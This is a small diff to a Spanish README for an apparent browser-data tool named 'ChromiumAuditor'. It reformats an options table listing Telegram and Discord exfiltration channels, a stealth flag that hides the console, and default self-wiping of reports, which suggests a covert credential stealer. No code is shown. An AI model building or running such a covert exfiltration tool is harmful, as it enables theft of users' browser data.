@@ -108,9 +108,9 @@ pyinstaller --onefile --noconsole --name "ChromiumAuditor" main.py
 | **`-t`** | `--telegram-token` | Token del bot de Telegram (Plano o B64). |
 | **`-c`** | `--telegram-chatid` | ID del chat de Telegram (Plano o B64). |
 | **`-d`** | `--discord` | URL del Webhook de Discord (Plano o B64). |
-| 🕵️ | `-s` / `--stealth` | Oculta la consola en tiempo real (idéntico a `.exe --noconsole`). |
-| 🧹 | `--no-wipe` | Evita auto-borrado del reporte. |
-| 🛠️ | `-v` | Modo verboso (logs detallados). |
+| `-s` | `--stealth` | Oculta la consola en tiempo real (idéntico a `.exe --noconsole`). |
+| — | `--no-wipe` | Evita auto-borrado del reporte. |
+| `-v` | `--verbose` | Modo verboso (logs detallados). |
 
 ---
 
